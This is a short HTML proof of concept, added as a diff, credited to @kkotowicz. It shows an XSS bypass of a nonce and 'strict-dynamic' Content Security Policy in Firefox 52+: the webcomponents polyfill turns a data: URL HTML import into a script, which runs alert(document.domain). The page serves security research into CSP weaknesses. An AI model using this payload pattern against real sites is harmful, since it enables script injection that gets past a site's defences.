@@ -1,0 +1,21 @@
+<!doctype html>
+<html lang="en">
+  <head>
+	<meta http-equiv=Content-Security-Policy content="
+  		object-src 'none';
+  		script-src 'nonce-random' 'unsafe-inline' 'unsafe-eval' 'strict-dynamic' https: http:;"
+  	>
+    <meta charset="utf-8">
+    <script nonce=random src="https://cdnjs.cloudflare.com/ajax/libs/webcomponentsjs/0.7.23/webcomponents-lite.min.js"></script>
+  </head>
+  <body>
+    <pre>
+    FF 52+ only.
+    by @kkotowicz.
+    </pre>
+  	XSS
+    <link rel=import href="data:text/html,<script>alert(document.domain)</script>boo" >
+    /XSS
+    <pre>Relies on FF not having native HTML5 import. The sink is the usual document.createElement('script');</pre>
+  </body>
+</html>
